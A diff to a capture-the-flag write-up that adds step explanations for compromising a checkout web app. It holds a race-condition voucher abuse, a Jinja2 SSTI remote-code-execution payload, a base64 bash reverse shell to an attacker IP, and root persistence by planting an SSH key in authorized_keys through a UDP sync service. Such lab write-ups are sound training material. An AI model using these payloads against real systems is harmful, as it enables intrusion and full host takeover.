@@ -14,7 +14,7 @@ Burg3r Bytes has recently upgraded its checkout system, implementing a modern di
 
 ### What is the web app flag?
 
-1. ...
+1. Perform a full port scan with service version detection to identify all open ports and running services on the target machine.
 
 ```bash
 nmap -p- -sVC <TARGET_IP>
@@ -35,29 +35,29 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-2. Open the `http://<TARGET_IP>/checkout` in two browser and use `{{7*7}}` as name, and `TRYHACK3M` as 50% discount voucher. While using the voucher at the same time we get to the receipt page where our name is reflected as **49** ...
+2. Open `http://<TARGET_IP>/checkout` in **two separate browser windows** side by side. In the **Name** field enter the Jinja2 SSTI probe payload `{{7*7}}`, and enter `TRYHACK3M` as the 50% discount voucher code. Submit both windows at the same moment to exploit a **race condition** in the voucher redemption logic. The server validates and marks the voucher as used in two separate, non-atomic operations, so simultaneous requests both pass validation before either is marked as redeemed. On reaching the receipt page, the name field is rendered as **49**, confirming that user input is passed directly into a Jinja2 template without sanitisation.
 
 [SCREEN01]
 
-3. ...
+3. Start a Netcat listener on the attacking machine to receive the reverse shell connection that will be triggered in the next steps.
 
 ```bash
 nc -lvnp 4444
 ```
 
-4. ...
+4. Generate a Base64-encoded reverse shell one-liner. Encoding avoids issues with special characters such as `&`, `>`, and `/` when the command is embedded inside the Jinja2 template expression.
 
 ```bash
 echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
 ```
 
-5. ...
+5. Exploit the confirmed SSTI to achieve Remote Code Execution. The payload traverses Flask's request context to reach Python's built-in `__import__`, imports the `os` module, and calls `popen` to decode and execute the Base64 reverse shell. Paste the following into the **Name** field in the checkout form, replacing the Base64 string with your own output from step 4.
 
 ```py
 {{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzxBVFRBQ0tFUl9JUD4vNDQ0NCAwPiYxCg== | base64 -d | bash').read()}}
 ```
 
-6. ...
+6. Retrieve the web app flag from the Flask application's working directory.
 
 ```bash
 cat flag.txt
@@ -71,7 +71,7 @@ cat flag.txt
 
 _Located in /root on the host machine_
 
-1. ...
+1. Stabilise the reverse shell for a fully interactive session.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -80,7 +80,7 @@ Ctrl+Z
 stty raw -echo;fg;
 ```
 
-2. ...
+2. Inspect the `/app/cron` directory to identify scheduled tasks and supporting files. The presence of `client_py.py`, RSA certificate files, and a crontab strongly suggests the container periodically communicates with the host machine using a custom encrypted file-transfer protocol over UDP port 69.
 
 ```bash
 ls -la /app/cron
@@ -95,7 +95,7 @@ ls -la /app/cron
 -rw-rw-r-- 1 root root   62 Apr 10  2024 crontab
 ```
 
-3. Modyfy `client_py.py` ...
+3. Make a working copy of `client_py.py` to modify safely.
 
 ```bash
 cp client_py.py client_py2.py
@@ -296,7 +296,7 @@ if __name__ == '__main__':
     main()
 ```
 
-4. ...
+4. Enumerate the host machine by reading `cmdline` through the sync server. `172.17.0.1` is the Docker bridge gateway, the physical host from inside the container. Port `69` is the UDP port the sync server listens on. The `cmdline` file reveals the exact command used to launch the server process, exposing the path to the server script.
 
 ```bash
 python3 client_py2.py 172.17.0.1 69 get /proc/self/cmdline cmdline
@@ -309,37 +309,37 @@ cat cmdline
 /usr/bin/python3/opt/3M-syncserver/server.py
 ```
 
-5. ...
+5. Retrieve the server's public certificate from the path discovered above. This certificate is required to encrypt file uploads. Without it, `put_file` returns an error and write operations are blocked.
 
 ```bash
 python3 client_py2.py 172.17.0.1 69 get /opt/3M-syncserver/server.crt server.crt
 ```
 
-6. ...
+6. Generate a fresh RSA SSH key pair in the current directory. The public key will be planted in the host's root account to grant passwordless SSH access.
 
 ```bash
 ssh-keygen -f id_rsa
 ```
 
-7. ...
+7. Upload the generated public key to `/root/.ssh/authorized_keys` on the host. Now that `server.crt` is present in the working directory, the client loads it automatically and `put_file` can encrypt the transfer.
 
 ```bash
 python3 client_py2.py 172.17.0.1 69 put id_rsa.pub /root/.ssh/authorized_keys
 ```
 
-8. ...
+8. Read the `authorized_keys` file back from the host to confirm the upload completed successfully.
 
 ```bash
 python3 client_py2.py 172.17.0.1 69 get /root/.ssh/authorized_keys authorized_keys
 ```
 
-9. ...
+9. Use the private key to connect to the host machine directly as root over SSH.
 
 ```bash
 ssh -i id_rsa root@<TARGET_IP>
 ```
 
-10. ...
+10. Locate and read the host flag.
 
 ```bash
 cat a467ea.txt
